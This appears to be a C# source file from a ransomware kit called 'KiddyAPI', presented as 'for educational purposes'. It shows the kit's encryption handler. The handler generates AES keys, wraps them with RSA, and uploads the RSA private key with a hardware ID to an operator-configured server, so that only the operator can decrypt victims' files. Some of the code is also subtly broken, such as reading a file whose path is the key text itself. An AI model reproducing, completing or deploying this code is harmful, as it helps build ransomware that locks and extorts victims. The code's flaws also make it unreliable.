/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////

using System.IO;
using System.Net;
using System.Security.Cryptography;
using KiddyAPI.Info;
using KiddyAPI.Protect;

namespace KiddyAPI.Crypt
{
    public class Handler
    {
        public static byte[] GenerateKey()
        {
            var aes = new RijndaelManaged() {KeySize = 256};
            aes.GenerateKey();
            var rsa = new RSACryptoServiceProvider(2048);
            File.WriteAllText("public.txt", rsa.ToXmlString(false)); // Public RSA key to txt file
            if (Config.uploadRSAPrivateKey != null)
                new WebClient().UploadString(Config.uploadRSAPrivateKey,
                    File.ReadAllText(rsa.ToXmlString(true)) + "ID: " + UniqueID.GetUniqueHardwaeId()); // Upload private key and id to u server
            else
            {
                File.WriteAllText("private.txt", rsa.ToXmlString(true)); //DELETE IT IF U NO DEBUGGING
            }
            File.WriteAllBytes("aes.txt", rsa.Encrypt(aes.Key,false));
            return aes.Key;
        }

        public static byte[] Encrypt(byte[] dataBytes, byte[] key)
        {
            var aes = new RijndaelManaged();
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[]{1,2,3,4,5,6,7,8}; // any salt, > 8
            using (MemoryStream ms = new MemoryStream())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                var help = new Rfc2898DeriveBytes(key, saltBytes, 1000);
                aes.IV = help.GetBytes(aes.BlockSize / 8);
                aes.Mode = CipherMode.CBC;
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(key, aes.IV), CryptoStreamMode.Write))
                {
                    cs.Write(dataBytes,0,dataBytes.Length);
                    cs.Close();
                }

                encryptedBytes = ms.ToArray();
                aes.Clear();
            }

            return encryptedBytes;
        }

        public static byte[] Decrypt(byte[] cipherData, byte[] key)
        {
            var aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[]{1,2,3,4,5,6,7,8}; // salt must be same
            using (MemoryStream ms = new MemoryStream())
            {
                var help = new Rfc2898DeriveBytes(key,saltBytes,1000);
                aes.IV = help.GetBytes(aes.BlockSize / 8);
                aes.Mode = CipherMode.CBC;
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(key, aes.IV), CryptoStreamMode.Write))
                {
                    cs.Write(cipherData,0,cipherData.Length);
                    cs.Close();
                }

                decryptedBytes = ms.ToArray();
                aes.Clear();
                
            }

            return decryptedBytes;
        }


    }
}
